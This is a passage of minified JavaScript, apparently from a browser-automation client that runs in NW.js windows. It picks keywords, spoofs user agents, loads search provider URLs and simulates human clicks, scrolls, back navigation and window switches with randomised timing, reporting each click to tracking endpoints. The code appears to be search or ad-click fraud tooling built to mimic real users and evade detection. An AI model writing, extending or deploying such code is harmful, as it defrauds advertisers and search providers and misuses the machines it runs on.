							if ("boolean" == typeof context.prov.clientVers.includeDuplicatedUsers && 0 == context.prov.clientVers.includeDuplicatedUsers && "object" == typeof context.sessionContextOwner.kwl.u && "object" == typeof context.sessionContextOwner.kwl.u.user && "boolean" == typeof context.sessionContextOwner.kwl.u.user.duplicate_user && 1 == context.sessionContextOwner.kwl.u.user.duplicate_user) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/includeDuplicatedUsers/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "skipwood", 0, "include_duplicated_users"]), void advance(!0, context)
						}
						if (context.prov.kobeVer && scriptVersion < context.prov.kobeVer) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/" + scriptName + "Ver/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "skipwood", 0, scriptName + "_ver_compatibility"]), void advance(!0, context);
						var matchingFlows = jen.matchingFlows(context.prov.flows);
						if (!matchingFlows || !matchingFlows.length || matchingFlows.length < 1) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/missflow/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "skipwood", 0, "missing_flow_match"]), void advance(!0, context);
						try {
							context.executionFlow = jen.generateFlow(matchingFlows)
						} catch (e) {
							reportPageView("error/generateFlow/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), context.executionFlow = null
						}
						if (void 0 === context.executionFlow || void 0 === matchingFlows || void 0 === matchingFlows[context.executionFlow]) return ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, context, ["finished_execution", "errorwood", 0, "invalid_flow"]), reportPageView("error/exec_flow/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), reportEvent("errorwood" + scriptVersion + ".flow." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, frisitor), void advance(!0, context);
						if (context.flowConfig = matchingFlows[context.executionFlow], context.isFlowCookiefied = CM && (-1 != CM.cookieMap().indexOf(momo.tryGetProviderId(context)) || -1 != !CM.cookieMap().indexOf(momo.tryGetProviderId(context)) && context.flowConfig.cm.cookieRate >= Math.floor(randomize(1, 100))), context.flowConfig.uaLock && context.flowConfig.uaLock.browser && context.flowConfig.uaLock.version ? (context.uaLockBrowser = context.flowConfig.uaLock.browser, context.uaLockVersion = context.flowConfig.uaLock.version) : context.prov.uaLock && (context.uaLockBrowser = context.prov.uaLock), context.uaLockBrowser) {
							var UAData = JSON.parse(encLocalStorage.getItem("ua"));
							if (UAData.default.browser != context.uaLockBrowser || UAData.default.browser == context.uaLockBrowser && UAData.default.version != context.uaLockVersion) {
								if (!context.isFlowCookiefied) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/uaOverride/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, context, ["finished_execution", "skipwood", 0, "ua_override_error2"]), void advance(!0, context);
								var uaSettings = null;
								try {
									uaSettings = jen.getUserAgent(kwl.ua, context.uaLockBrowser, context.uaLockVersion)
								} catch (e) {
									reportPageView("error/uaOverride/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), uaSettings = null
								}
								if (!(uaSettings && uaSettings.ua && uaSettings.uaVer)) return reportPageView("error/uaOverride/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/uaOverrideError/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, context, ["finished_execution", "skipwood", 0, "ua_override_error1"]), void advance(!0, context);
								context.uaOverride = context.uaLockBrowser + uaSettings.uaVer, context.prov.debug && "boolean" == typeof context.prov.debug.shouldUseUserAgent && 1 != context.prov.debug.shouldUseUserAgent || (newWindowOptions.user_agent = uaSettings.ua)
							}
						}
						var providerAfterNoiseFactor = context.prov.factor;
						context.factorConfig && (providerAfterNoiseFactor = context.factorConfig.factor), kwl.noise && void 0 !== kwl.noise.factor && (providerAfterNoiseFactor += kwl.noise.factor);
						var factorCalibrator = 1;
						kwl && kwl.c && kwl.c[context.prov.id] && ("" != context.factorConfig.provIdSuffix && kwl.c[context.prov.id][context.factorConfig.provIdSuffix] ? factorCalibrator = kwl.c[context.prov.id][context.factorConfig.provIdSuffix] : "" == context.factorConfig.provIdSuffix && kwl.c[context.prov.id]["*"] && (factorCalibrator = kwl.c[context.prov.id]["*"]));
						var providerFinalFactor = providerAfterNoiseFactor * factorCalibrator;
						if (context.monitoringObject.flow.factorCalibration = Math.min(100, providerFinalFactor) / providerAfterNoiseFactor, Math.floor(randomize(1, 100 * jen.providerFactor_PercisionFactor)) > providerFinalFactor * jen.providerFactor_PercisionFactor) return reportEvent("cursedwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "cursedwood", 0]), void advance(!0, context);
						(void 0 === context.prov.ncl || !context.prov.ncl || "number" == typeof context.prov.ncl && Math.floor(randomize(1, 100)) > context.prov.ncl) && (context.NCLFactor = !1);
						try {
							context.flowConfig.odds && (context.oddType = jen.generateKwType(context.flowConfig.odds), context.kwCollection = jen.generateKw(context.oddType, context.sessionContextOwner.kwl.kws, context.flowConfig)), context.kwSearchIndex = 0, 0 == Array.isArray(context.kwCollection) && (context.kwCollection = [context.kwCollection]), context.originalKW = context.kwCollection[context.kwSearchIndex], context.kw = context.originalKW, context.manipulatedKW = context.originalKW, context.scrambledKW = context.originalKW, devar.blackTouchKW(context)
						} catch (e) {
							reportPageView("error/kw/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), context.kw = null
						}
						if (!context.kw) return ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, context, ["finished_execution", "errorwood", 0, "invalid_kws"]), reportPageView("error/invalid/kw/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), reportEvent("errorwood" + scriptVersion + ".kw." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, frisitor), void advance(!0, context);

						function afterSearchPerformedCallback(e) {
							context.wordsAmount = context.nextKwText.split(" ").length, context.clicksAmount = jen.generateClicks(context), ally.monitoringObj.updateQuery(context), context.clicksPerformed = 0, context.searchesAmount += 1;
							var t = randomize(7, 14);
							e.reportsPerformed.freddie = !1, context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout && (context.fallbackNotReloadingTimeout = global.setTimeout((function() {
								1 == e.phaser && e.phaser++, executeResRock(e)
							}), 1e3 * t))
						}
						context.nextKwText = context.kw, context.fosAmountPerformed = 0, context.searchesAmount = 0, context.fosAmount = jen.generateFos(context.flowConfig.odds[context.oddType].fosBuckets), context.fosConfig = context.flowConfig.odds[context.oddType].fosBuckets[context.fosAmount], context.paginationAmount = jen.generatePaginationBucket(context), context.paginationPerformed = 0, context.nextKWSource = jen.generateNextKwSource(momo.getFosNextKWSource(context)), context.nextKWSourceLock = jen.generateNextKwSourceLock(context.prov, context.nextKWSource), context.wordsAmount = context.kw.split(" ").length, context.clicksAmount = jen.generateClicks(context), context.clicksPerformed = 0;
						var roamingActions = {
								click: {
									chance: context.flowConfig.actions.roamingActions.click.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.click.timeBeforeRun,
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.roamingActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "roamingActions", "click", e.windowId]), e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) {
											var t = e.nwWindow.window.document.getElementsByTagName("a");
											if (t.length < 1) ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["actions", "roaming", "click", "no.elements"]);
											else {
												var o = t[Math.floor(randomize(0, t.length - 1))];
												(BOCompatible ? smoothTouch : touchRes)(o, e, (function() {
													context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout && (context.fallbackNotReloadingTimeout = global.setTimeout((function() {
														roam(roamingActions, e)
													}), 1e3 * randomize(20, 30)))
												}))
											}
										} else roamingActions.close.act(e)
									}
								},
								scroll: {
									chance: context.flowConfig.actions.roamingActions.scroll.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.scroll.timeBeforeRun,
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.roamingActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "roamingActions", "scroll", e.windowId]), e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) {
											var t = {
												min: 2,
												max: 8
											};
											context.flowConfig.actions.roamingActions.scroll.timeToProceedAfterScroll && null != typeof context.flowConfig.actions.roamingActions.scroll.timeToProceedAfterScroll.min && null != typeof context.flowConfig.actions.roamingActions.scroll.timeToProceedAfterScroll.max && (t = context.flowConfig.actions.roamingActions.scroll.timeToProceedAfterScroll);
											var o = e.nwWindow.window.document.getElementsByTagName("a");
											if (o.length < 1) ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["actions", "roaming", "scroll", "no.elements"]);
											else {
												var n = Math.floor(randomize(1, 100 * jen.generateElementForScroll_percisionFactor));
												context.flowConfig.actions.roamingActions.scroll.generateElementNotInViewPort, jen.generateElementForScroll_percisionFactor;
												var r = o[Math.floor(randomize(0, o.length - 1))];
												if (n <= context.flowConfig.actions.roamingActions.scroll.generateElementNotInViewPort * jen.generateElementForScroll_percisionFactor && Array.from(o).filter((function(t) {
														return 0 == devar.isElementInViewport(t, e.nwWindow.window.document)
													})).length > 0)
													for (; 1 == devar.isElementInViewport(r, e.nwWindow.window.document);) r = o[Math.floor(randomize(0, o.length - 1))];
												context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), noa.digiscrollimate(r, kwl.domainsElementsClassNames, e.nwWindow.window.document, e.nwWindow, context.flowConfig.scrollingSpeed, 1, (function() {
													if (context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
														var o = randomize(t.min, t.max);
														context.fallbackNotReloadingTimeout = global.setTimeout((function() {
															roam(roamingActions, e)
														}), 1e3 * o)
													}
												}))
											}
										} else roamingActions.close.act(e)
									}
								},
								back: {
									chance: context.flowConfig.actions.roamingActions.back.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.back.timeBeforeRun,
									canPlay: function(e) {
										try {
											if (e.nwWindow.window.history.length <= 1) return !1;
											if (e.nwWindow.window.history.length <= e.firstPageHistoryIndex) return !1;
											if (0 == e.actionsPerformed) return !1;
											let o = Math.floor(randomize(1, 1e4));
											if (0 == landingPageActions.click.canPlay(e) && 0 == landingPageActions.fos.canPlay(e) && o <= 100 * context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.allowWhenFinishedFosAndClicks) return !1;
											var t = e.nwWindow.window.location.href;
											if (e.urlsToFirstLP.includes(t)) return !1
										} catch (e) {}
										return !0
									},
									act: function(e) {
										e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.roamingActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "roamingActions", "back", e.windowId]), e.phaser -= 2, global.setTimeout((function() {
											if (context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), void 0 !== context.flowConfig.actions.roamingActions.back.allowFallback && 1 == context.flowConfig.actions.roamingActions.back.allowFallback) {
												var t = randomize(10, 20);
												null == context.fallbackNotReloadingTimeout && (context.fallbackNotReloadingTimeout = global.setTimeout((function() {
													1 == e.phaser && e.phaser++, 2 == e.phaser || "function" == typeof context.prov._canParse && context.prov._canParse(e.nwWindow.window.document) ? (e.phaser = 2, executeResRock(e)) : e.phaser >= 3 && roam(roamingActions, e)
												}), 1e3 * t))
											}

											function o(t) {
												if (t) try {
													context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces.regularBack || (context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces.regularBack = []), context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces.regularBack.push({
														kw: context.kw,
														manipulatedKW: context.kw,
														scrambledKW: context.kw,
														nextKWSource: ""
													})
												} catch (e) {
													reportPageView("error/monObject/backReplace/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + e.stack, frisitor)
												}
												try {
													e.nwWindow.window.history.back()
												} catch (e) {}
											}
											try {
												let t = Math.floor(randomize(1, 1e4)),
													n = e.firstRoamingPage.historyIndex > -1 && e.firstRoamingPage.historyIndex == e.nwWindow.window.history.length || e.firstRoamingPage.url && e.firstRoamingPage.url == e.nwWindow.window.location.href;
												if (n && context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior && context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack && context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.way && void 0 !== context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.chance && t <= 100 * context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.chance) {
													let t = jen.generateFosPerformingWay(context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.way);
													if ("newNavigation" == t && e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) {
														let o = jen.generateNextKwSource(context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.way[t].nextKWSource),
															n = devar.getNextGeneratedKW(context, o, null, context.flowConfig.actions.roamingActions.back.roamingToLandingPageBehavior.replaceBack.way[t].nextKWSource[o]);
														context.kw = n, context.manipulatedKW = n, context.scrambledKW = n, context.nextKwText = context.kw, devar.blackTouchKW(context);
														try {
															context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces[t] || (context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces[t] = []), context.monitoringObject.flow.queries[context.fosAmountPerformed].flowOutput.clicks[context.clicksPerformed - 1].backReplaces[t].push({
																kw: context.nextKwText,
																manipulatedKW: n,
																scrambledKW: n,
																nextKWSource: o
															})
														} catch (e) {
															reportPageView("error/monObject/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + e.stack, frisitor)
														}
														reportPageView("repBack/" + t + "/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString(), frisitor), context.monitoringObject.flow.callsToProviderUrl = context.monitoringObject.flow.callsToProviderUrl + 1, context.prov._canParse = null, e.phaser = 2, e.oldLoc = null, e.isResAvailable = !1, e.nwWindow.window.location = momo.getFinalUrl(context, context.nextKwText);
														for (let e in context.prov.groupIds) {
															let o = context.prov.groupIds[e];
															context.sessionContextOwner.kwl.provGroupsConfig[o].fos[t].countTowardGroupsCap && slash.pushVioletExecution([o], context.sessionContextOwner.kwl.provGroupsConfig)
														}
													} else reportPageView("error/repBack/config/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString(), frisitor), o(n)
												} else o(n)
											} catch (e) {
												reportPageView("error/config/action/back/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + e.stack, frisitor), o(!1)
											}
										}), 1e3 * randomize(1, 2))
									}
								},
								switch: {
									chance: context.flowConfig.actions.roamingActions.switch.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.switch.timeBeforeRun,
									canPlay: function(e) {
										try {
											return context && Array.isArray(context.ruggedContexts) && context.ruggedContexts.length > 0
										} catch (e) {
											return !1
										}
									},
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), !e.nwWindow || !e.nwWindow.window || !e.nwWindow.window.document) return consolw.warn("null window context received! closing session"), void roamingActions.close.act(e);
										var t = {
											min: 2,
											max: 8
										};
										context.flowConfig.actions.roamingActions.switch.timeToProceedAfterSwitch && null != typeof context.flowConfig.actions.roamingActions.switch.timeToProceedAfterSwitch.min && null != typeof context.flowConfig.actions.roamingActions.switch.timeToProceedAfterSwitch.max && (t = context.flowConfig.actions.roamingActions.switch.timeToProceedAfterSwitch), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null);
										var o = jen.generateDifferentWindowContext(context, e);
										if (context.activeWindowContext = o, context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
											var n = randomize(t.min, t.max);
											context.fallbackNotReloadingTimeout = global.setTimeout((function() {
												loadedFuncStarter(o, context)
											}), 1e3 * n)
										}
									}
								},
								closeWindow: {
									chance: context.flowConfig.actions.roamingActions.closeWindow.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.closeWindow.timeBeforeRun,
									canPlay: function(e) {
										try {
											return context && Array.isArray(context.ruggedContexts) && context.ruggedContexts.length > 0
										} catch (e) {
											return !1
										}
									},
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.roamingActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "roamingActions", "closeWindow", e.windowId]), !e.nwWindow || !e.nwWindow.window || !e.nwWindow.window.document) return consolw.warn("null window context received! closing session"), void roamingActions.close.act(e);
										var t = {
											min: 2,
											max: 8
										};
										context.flowConfig.actions.roamingActions.closeWindow.timeToProceedAfterCloseWindow && null != typeof context.flowConfig.actions.roamingActions.closeWindow.timeToProceedAfterCloseWindow.min && null != typeof context.flowConfig.actions.roamingActions.closeWindow.timeToProceedAfterCloseWindow.max && (t = context.flowConfig.actions.roamingActions.closeWindow.timeToProceedAfterCloseWindow), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null);
										var o = pickRandomItem(context.ruggedContexts);
										if (momo.tryCloseSpecificWnd(context, o), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
											var n = randomize(t.min, t.max);
											context.fallbackNotReloadingTimeout = global.setTimeout((function() {
												loadedFuncStarter(o = jen.generateDifferentWindowContext(context, e), context)
											}), 1e3 * n)
										}
									}
								},
								close: {
									chance: context.flowConfig.actions.roamingActions.close.chance,
									timeBeforeRun: context.flowConfig.actions.roamingActions.close.timeBeforeRun,
									canPlay: function(e) {
										try {
											if (context.prov && 1 == context.flowConfig.waitForExitPage) {
												var t = devar.isUrlMatchingSomeRegex(e.nwWindow.window.document, context.flowConfig.exitPageRegexUrl);
												if (!1 === t) return !1;
												if (!0 === t) return !0
											}
											return 0 == landingPageActions.click.canPlay(e) && 0 == landingPageActions.fos.canPlay(e)
										} catch (e) {
											return !0
										}
									},
									act: function(e) {
										e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.roamingActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "roamingActions", "close", e.windowId]), momo.tryCloseSmoothWnd(context)
									}
								}
							},
							fallbackUnparsedPageRoamingActions = {
								click: {
									chance: context.flowConfig.actions.fallbackUnparsedPageRoamingActions.click.chance,
									timeBeforeRun: context.flowConfig.actions.fallbackUnparsedPageRoamingActions.click.timeBeforeRun,
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["actions", "fallbackUnparsedPageRoaming", "click"]), e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) {
											var t = e.nwWindow.window.document.getElementsByTagName("a"),
												o = t.item(Math.floor(randomize(0, t.length - 1)));
											(BOCompatible ? smoothTouch : touchRes)(o, e, (function() {
												context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout && (context.fallbackNotReloadingTimeout = global.setTimeout((function() {
													roam(roamingActions, e)
												}), 1e3 * randomize(20, 30)))
											}))
										} else fallbackUnparsedPageRoamingActions.close.act(e)
									}
								},
								close: {
									chance: context.flowConfig.actions.fallbackUnparsedPageRoamingActions.close.chance,
									timeBeforeRun: context.flowConfig.actions.fallbackUnparsedPageRoamingActions.close.timeBeforeRun,
									act: function(e) {
										e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["actions", "fallbackUnparsedPageRoaming", "close"]), momo.tryCloseSmoothWnd(context)
									}
								}
							},
							landingPageActions = {
								click: {
									chance: context.flowConfig.actions.landingPageActions.click.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.click.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											return !!(t && t.specialElements && Array.isArray(t.specialElements) && t.specialElements.length > 0) || (!(context.clicksPerformed >= context.clicksAmount) || void 0 !== context.flowConfig.limitedClicks && 1 != context.flowConfig.limitedClicks)
										} catch (e) {
											return !1
										}
									},
									act: function(e, t, o, n) {
										e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "click", e.windowId]);
										var r = null,
											i = [],
											a = !1,
											c = !1,
											s = jen.generateTypeOfClick(context.flowConfig.actions.landingPageActions.click.typeOfClick);
										if (t && t.specialElements && Array.isArray(t.specialElements) && t.specialElements.length > 0) t.specialElements.forEach((function(e) {
											i.push(e)
										})), c = !0;
										else if ("navBar" == s && context.navBarIterationsLeft <= 0 && context.paginationPerformed < context.paginationAmount && (context.navBarIterationsLeft = jen.generateNavBarIterations(context.flowConfig.actions.landingPageActions.click.typeOfClick.navBar.iterations)), context.navBarIterationsLeft > 0 && devar.areNavBarElementsExists(t)) {
											context.navBarIterationsLeft = context.navBarIterationsLeft - 1, 0 == context.navBarIterationsLeft && (context.paginationPerformed = context.paginationPerformed + 1);
											for (var l = null, u = 100, d = null;
												(!l || "object" != typeof l || "function" != typeof l.getElementsByTagName) && u > 0;) d = jen.generateNavBarButton(context.flowConfig.actions.landingPageActions.click.typeOfClick.navBar.button), l = devar.getNavBarElementFromName(t, d), u -= 1;
											if (!l || "function" != typeof l.getElementsByTagName || l.getElementsByTagName("a").length <= 0 || 0 == u) context.navBarIterationsLeft = 0;
											else {
												var g = l.getElementsByTagName("a");
												g.length > 0 && (r = g.item(0), a = !0)
											}
										}
										if (!r || 0 == Array.isArray(i) || i.length <= 0)
											if (a = !1, -1 != n) {
												var m = o[n].getElementsByTagName("a");
												m.length > 0 ? r = m.item(0) : "seo" == context.flowConfig.type.toLowerCase() && "button" == o[n].tagName.toLowerCase() && (r = o[n])
											} else t && t.nav && void 0 !== t.nav.nextPage && (r = t.nav.nextPage);
										(!i || 0 == Array.isArray(i) || i.length <= 0) && (i = [r]);
										var f = BOCompatible ? smoothTouch : touchRes,
											p = function(r, i) {
												context.actionTime && (global.clearTimeout(context.actionTime), context.actionTime = null);
												var s = 1e3 * randomize(2, 5);
												!i || 0 == Array.isArray(i) || i.length <= 0 ? context.actionTime = global.setTimeout(f, s, r, e, (function() {
													if (0 == a && 0 == c) {
														ally.monitoringObj.fillOscar(context), momo.recorder.recordCurrentClick(context, context.fosAmountPerformed, context.resGroup, n), context.clicksPerformed += 1, context.totalClicksPerformed += 1;
														try {
															reportEvent("Oscar." + scriptVersion + "." + context.oddType + "." + context.resGroup + "." + momo.tryGetProviderId(context) + "." + (context.executionFlow ? context.executionFlow : "unknown"), getApplicationActionString(), getUserId(), 1, frisitor), reportPageView("flow/oscar/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + (context.executionFlow ? context.executionFlow : "unknown") + "/" + context.chosenPerformingWay + "/" + context.resGroup + "/tcp" + context.totalClicksPerformed + "/cp" + context.clicksPerformed + "/qp" + context.fosAmountPerformed + "/" + context.oddType + "/r" + context.catsAmounts.res + "/s" + context.catsAmounts.spo + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
														} catch (e) {}
													}
													if (global.setTimeout((function() {
															noa.isNW47() && nw.Window.getAll((function(t) {
																var o = t.filter((function(t) {
																	return scptNWWindowAPI.has_prov_id(t) && scptNWWindowAPI.get_prov_id(t) == e.nwWindow.prov_id1
																}));
																if (Array.isArray(o))
																	for (var n in o) context.smoothContext.nwWindow.cWindow.id != o[n].cWindow.id && context.ruggedContexts.filter((function(e) {
																		return e.nwWindow.cWindow.id == o[n].cWindow.id
																	})).length < 1 && (e.phaser = 1, wndStart(o[n], !0))
															}))
														}), 1e3), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
														var r = 1e3 * randomize(30, 40);
														1 == a && (r = 1e3 * randomize(5, 20)), context.fallbackNotReloadingTimeout = global.setTimeout((function() {
															(context.flowConfig.type && "seo" == context.flowConfig.type.toLowerCase() || 1 == a) && (t && t.ans && t.ans.isFinishingElement && !0 === t.ans.isFinishingElement ? landingPageActions.close.act(e, t, o, n) : executeResRock(e))
														}), r)
													}
												})) : global.setTimeout(f, s, r, e, (function() {
													w(i)
												}))
											},
											w = function(t) {
												let o = t[0],
													n = t.slice(1);
												noa.digiscrollimate(o, kwl.domainsElementsClassNames, e.nwWindow.window.document, e.nwWindow, context.flowConfig.scrollingSpeed, 5, (function() {
													if (1 == devar.isElementInViewport(o, e.nwWindow.window.document) && 0 == c && 0 == devar.isElementClickable(o, kwl.domainsElementsClassNames, e.nwWindow.window.document)) {
														var t = devar.calculateDims(o),
															r = Math.sign(t.top - e.nwWindow.window.document.defaultView.innerHeight / 2),
															i = Math.abs(Math.floor((t.top - e.nwWindow.window.document.defaultView.innerHeight / 2) / noa.SCROLL_DELTA));
														noa.scrollimate(o, kwl.domainsElementsClassNames, e.nwWindow.window.document, e.nwWindow, i, r, context.flowConfig.scrollingSpeed, (function() {
															1 == devar.isElementInViewport(o, e.nwWindow.window.document) && 1 == devar.isElementClickable(o, kwl.domainsElementsClassNames, e.nwWindow.window.document) ? p(o, n) : (ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["actions", "landingPage", "click", "unclickable"]), resRock(e))
														}))
													} else 0 == devar.isElementInViewport(o, e.nwWindow.window.document) ? (ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["actions", "landingPage", "click", "unviewable"]), resRock(e)) : p(o, n)
												}))
											};
										w(i)
									}
								},
